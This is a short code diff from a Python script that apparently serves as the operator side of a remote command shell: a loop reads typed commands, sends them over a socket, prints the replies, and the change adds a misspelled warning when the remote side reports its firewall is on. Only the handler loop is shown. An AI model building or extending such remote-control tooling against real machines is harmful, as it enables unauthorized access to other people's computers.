@@ -282,6 +282,7 @@ try:
                 print("enter 'exit' to exit")
                 while True:
                     a=input("enter a command: ")
+                    
                     if a=="exit":
                         conn.sendall(a.encode('utf-8'))
                         break
@@ -292,7 +293,12 @@ try:
                         continue
                     data=conn.recv(4096).decode('utf-8')
                     
+                        
                     if data=="abok":
+                        
+                        continue
+                    if data=="firewall is on":
+                        print("WORRINGE!!: firewall is on, you can`t use 'cmd' in this time\ntype 'exit' to use 'cmd' agen to ckick the firewall state")
                         continue
                     print(data) 
                 
